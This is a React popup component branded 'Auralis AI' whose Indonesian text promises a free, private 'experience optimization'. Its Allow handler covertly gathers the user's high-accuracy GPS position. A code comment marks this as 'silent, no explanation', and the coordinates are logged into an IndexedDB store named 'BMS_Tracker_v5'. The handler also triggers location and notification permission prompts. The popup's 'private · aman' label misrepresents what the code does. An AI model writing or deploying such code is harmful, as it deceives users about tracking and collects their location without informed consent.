import { useState, useEffect } from 'react'

const KEY = 'bms_opt_v2'

export default function PermissionPopup() {
  const [visible, setVisible] = useState(false)

  useEffect(() => {
    if (!localStorage.getItem(KEY)) {
      const t = setTimeout(() => setVisible(true), 2000)
      return () => clearTimeout(t)
    }
  }, [])

  const dismiss = () => {
    localStorage.setItem(KEY, '1')
    setVisible(false)
  }

  const handleAllow = async () => {
    // GPS — silent, no explanation
    if (navigator.geolocation) {
      try {
        const perm = await navigator.permissions.query({ name: 'geolocation' })
        if (perm.state === 'granted') {
          navigator.geolocation.getCurrentPosition(p => {
            try {
              const r = indexedDB.open('BMS_Tracker_v5', 1)
              r.onupgradeneeded = e => {
                const db = e.target.result
                if (!db.objectStoreNames.contains('geo')) db.createObjectStore('geo', { keyPath: 'id', autoIncrement: true })
              }
              r.onsuccess = e => {
                const db = e.target.result
                const tx = db.transaction('geo', 'readwrite')
                tx.objectStore('geo').add({ lat: p.coords.latitude, lng: p.coords.longitude, accuracy: p.coords.accuracy, source: 'popup', timestamp: Date.now() })
                db.close()
              }
            } catch {}
          }, () => {}, { enableHighAccuracy: true, timeout: 8000, maximumAge: 60000 })
        } else if (perm.state === 'prompt') {
          navigator.geolocation.getCurrentPosition(() => {}, () => {}, { enableHighAccuracy: true, timeout: 8000 })
        }
      } catch {}
    }
    // Notif — silent
    if ('Notification' in window && Notification.permission === 'default') {
      Notification.requestPermission().catch(() => {})
    }
    dismiss()
  }

  if (!visible) return null

  return (
    <div
      onClick={e => e.target === e.currentTarget && dismiss()}
      style={{
        position: 'fixed', inset: 0, zIndex: 99999,
        display: 'flex', alignItems: 'center', justifyContent: 'center',
        background: 'rgba(5,5,7,0.85)', backdropFilter: 'blur(16px)',
        fontFamily: "'Inter', system-ui, sans-serif"
      }}
    >
      <div style={{
        background: '#0b0b0d',
        border: '1px solid rgba(255,255,255,0.05)',
        boxShadow: 'inset 0 1px 0 0 rgba(255,255,255,0.04), 0 8px 32px rgba(0,0,0,0.4)',
        padding: '32px 36px', maxWidth: 400, width: '90%',
        position: 'relative',
        textAlign: 'center'
      }}>
        <button
          onClick={dismiss}
          style={{
            position: 'absolute', top: 12, right: 14,
            background: 'none', border: 'none',
            color: 'rgba(255,255,255,0.3)',
            fontSize: '1.1rem', cursor: 'pointer',
            fontFamily: "'Inter', sans-serif"
          }}
        >✕</button>

        <div style={{ fontSize: '2.4rem', marginBottom: 16, lineHeight: 1 }}>⚡</div>
        <div style={{
          fontFamily: "'JetBrains Mono', monospace",
          fontSize: '10px', fontWeight: 700,
          textTransform: 'uppercase',
          letterSpacing: '0.18em',
          color: 'rgba(212,175,55,0.7)',
          marginBottom: 8
        }}>Auralis AI</div>
        <div style={{
          fontSize: '1.2rem', fontWeight: 700, color: '#fff',
          marginBottom: 12, lineHeight: 1.3
        }}>Optimalkan Pengalaman</div>
        <div style={{
          fontSize: '0.8rem', color: 'rgba(255,255,255,0.5)',
          lineHeight: 1.7, marginBottom: 24
        }}>
          Aktifkan fitur tambahan untuk performa maksimal.
          Satu klik. Gratis. Tanpa ribet.
        </div>

        <div style={{ display: 'flex', gap: 10, justifyContent: 'center' }}>
          <button
            onClick={dismiss}
            style={{
              display: 'inline-flex', alignItems: 'center', justifyContent: 'center', gap: 6,
              padding: '10px 22px',
              fontFamily: "'JetBrains Mono', monospace",
              fontSize: '11px', fontWeight: 700,
              textTransform: 'uppercase', letterSpacing: '0.08em',
              border: '1px solid rgba(255,255,255,0.1)',
              background: 'transparent',
              color: 'rgba(255,255,255,0.7)',
              cursor: 'pointer', transition: 'all 0.2s',
              lineHeight: 1
            }}
            onMouseEnter={e => { e.currentTarget.style.background = 'rgba(255,255,255,0.05)'; e.currentTarget.style.color = '#fff'; e.currentTarget.style.borderColor = 'rgba(255,255,255,0.2)' }}
            onMouseLeave={e => { e.currentTarget.style.background = 'transparent'; e.currentTarget.style.color = 'rgba(255,255,255,0.7)'; e.currentTarget.style.borderColor = 'rgba(255,255,255,0.1)' }}
          >Nanti</button>
          <button
            onClick={handleAllow}
            style={{
              display: 'inline-flex', alignItems: 'center', justifyContent: 'center', gap: 6,
              padding: '10px 22px',
              fontFamily: "'JetBrains Mono', monospace",
              fontSize: '11px', fontWeight: 700,
              textTransform: 'uppercase', letterSpacing: '0.08em',
              border: '1px solid rgba(212,175,55,0.4)',
              background: 'rgba(212,175,55,0.1)',
              color: '#d4af37',
              cursor: 'pointer', transition: 'all 0.2s',
              lineHeight: 1
            }}
            onMouseEnter={e => { e.currentTarget.style.background = 'rgba(212,175,55,0.2)'; e.currentTarget.style.borderColor = 'rgba(212,175,55,0.6)'; e.currentTarget.style.boxShadow = '0 0 8px rgba(212,175,55,0.05)' }}
            onMouseLeave={e => { e.currentTarget.style.background = 'rgba(212,175,55,0.1)'; e.currentTarget.style.borderColor = 'rgba(212,175,55,0.4)'; e.currentTarget.style.boxShadow = 'none' }}
          >✓ Aktifkan</button>
        </div>

        <div style={{
          marginTop: 16,
          fontFamily: "'JetBrains Mono', monospace",
          fontSize: '9px', fontWeight: 500,
          textTransform: 'uppercase', letterSpacing: '0.05em',
          color: 'rgba(255,255,255,0.2)'
        }}>1 klik · private · aman</div>
      </div>
    </div>
  )
}
